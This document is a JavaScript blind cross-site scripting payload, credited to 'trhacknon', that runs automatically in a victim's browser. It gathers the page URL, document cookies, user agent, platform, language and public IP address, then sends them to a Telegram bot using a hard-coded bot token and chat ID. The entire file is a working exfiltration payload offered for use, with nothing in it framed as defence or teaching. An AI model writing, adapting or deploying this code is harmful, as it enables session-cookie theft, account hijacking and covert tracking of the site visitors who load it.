var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
var chatId = '-1001690993326'; // Your "chatId" Here

function getIPAddress(callback) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                callback(null, JSON.parse(xhr.responseText).ip);
            } else {
                callback('Failed to fetch IP address', null);
            }
        }
    };
    xhr.open('GET', 'https://api64.ipify.org?format=json', true);
    xhr.send();
}

function getHostname(callback) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                callback(null, xhr.responseText);
            } else {
                callback('Failed to fetch hostname', null);
            }
        }
    };
    xhr.open('GET', 'https://api64.ipify.org/api/v1?hostname=true', true);
    xhr.send();
}

function getClientInfo() {
    var info = `
<b>Blind XSS Alert by trhacknon</b>

<b>XSS Alert in ${document['domain']}</b>
------------------------------------------------

<b>- URL Target -</b>
<pre>${document['location']['hostname']}${document['location']['pathname']}</pre>

<b>- Document Cookie -</b>
<pre>${document['cookie']}</pre>

<b>- User Agent -</b>
<pre>${navigator.userAgent}</pre>

<b>- Platform -</b>
<pre>${navigator.platform}</pre>

<b>- Language -</b>
<pre>${navigator.language}</pre>

<b>- Online Status -</b>
<pre>${navigator.onLine}</pre>
`;

    getIPAddress(function (ipError, ipAddress) {
        if (ipError) {
            info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
            telegramSend(info);
            return;
        }

        getHostname(function (hostnameError, hostname) {
            if (hostnameError) {
                info += `<b>- Hostname -</b>\n<pre>Error: ${hostnameError}</pre>`;
            } else {
                info += `<b>- Hostname -</b>\n<pre>${hostname}</pre>`;
            }

            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
            telegramSend(info);
        });
    });
}

function telegramSend(textData) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(textData) + '&parse_mode=html', true);
    xhr.send();
}

getClientInfo();
